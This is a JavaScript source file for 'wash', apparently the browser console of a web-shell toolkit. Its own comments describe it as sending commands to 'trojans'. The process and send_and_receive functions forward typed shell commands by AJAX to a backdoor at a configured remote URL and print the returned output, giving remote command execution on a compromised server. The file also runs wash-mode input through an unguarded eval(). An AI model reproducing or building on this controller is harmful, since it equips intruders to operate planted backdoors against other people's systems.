// this is the top-level application object
var wash = {

    // properties for sending communications out to the trojans
    action : '',
    args   : {},
    cmd    : '',

    // store the version number (sometimes this is handy)
    version: '0.5.0',

    // processes commands on the wash prompt
    process: function(command){
        // parse out the wash action
        if(shell.prompt.mode.get() == 'wash'){
            // process wash commands as pure JavaScript. This allows for
            // tremendous extensibility
            try{
                eval(command);
            }catch(e){
                shell.output.write('wash error: Invalid command.', 'output wash_error');
            }
        }
        
        // if the prompt is not in wash mode, default to shell action
        else {

            // listen for re-mapped commands
            // @see: extensions/wash.remap.js
            if(wash.remap[command] != null){ command = wash.remap[command]; }

            wash.command.action = 'shell';
            wash.command.cmd    = command;
            //wash.command.crypto.encrypt();
            wash.send_and_receive();
        }
    },

    // sends a command to the trojan
    send_and_receive: function(){
        // make the AJAX request to the trojan
        $.ajax({
            type : wash.connection.request_type,
            url  : wash.connection.protocol + '://' + wash.connection.domain + wash.connection.url,
            data : wash.command,
        }).done(function(response){
            // parse the JSON response
            wash.response = JSON.parse(response);

            // set the prompt context
            shell.prompt.context.set(wash.response.prompt_context);

            // output the last command as history
            shell.output.write(wash.response.prompt_context + ' ' + shell.prompt.get());

            // display output or error, depending on which was received
            if(wash.response.error != null){
                shell.output.write(wash.response.error, 'output wash_error');
            } else {
                shell.output.write(wash.response.output, 'output');
            }
        });
    }
}
